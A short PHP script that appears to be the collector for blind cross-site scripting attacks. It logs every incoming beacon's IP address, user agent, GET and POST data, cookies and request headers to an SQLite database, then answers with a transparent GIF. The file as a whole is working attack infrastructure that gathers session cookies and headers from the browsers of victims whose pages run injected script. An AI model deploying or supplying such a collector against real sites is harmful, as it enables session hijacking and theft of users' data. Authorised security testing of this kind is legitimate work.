<?php
// blind_logger.php - records blind XSS "beacon" hits into the DB
$dbfile = __DIR__ . '/db.sqlite';
if (!file_exists($dbfile)) {
    http_response_code(500);
    echo 'DB missing';
    exit;
}
$db = new PDO('sqlite:' . $dbfile);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$params = json_encode(array(
    'GET' => $_GET,
    'POST' => $_POST,
    'COOKIE' => $_COOKIE,
    'HEADERS' => getallheaders()
));
$st = $db->prepare('INSERT INTO blind_hits (remote_addr, user_agent, params) VALUES (:ra, :ua, :p)');
$st->execute([
    ':ra' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    ':ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    ':p' => $params
]);

// Optionally return a small transparent gif to simulate beacon
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==');
